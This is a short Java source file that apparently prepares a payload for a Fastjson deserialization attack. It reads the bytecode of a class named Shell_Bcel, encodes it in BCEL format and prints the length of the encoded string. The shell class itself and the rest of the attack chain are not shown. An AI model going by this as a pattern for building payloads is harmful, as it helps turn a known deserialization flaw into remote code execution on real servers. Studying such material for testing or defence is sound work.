import com.sun.org.apache.bcel.internal.classfile.Utility;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

import java.io.IOException;

public class fastjson {
    public static void main(String[] args) throws NotFoundException, IOException, CannotCompileException {
        ClassPool aDefault = ClassPool.getDefault();
        CtClass ctClass = aDefault.get(Shell_Bcel.class.getName());
        String encode = Utility.encode(ctClass.toBytecode(), true);
        System.out.println(encode.length());
    }
}
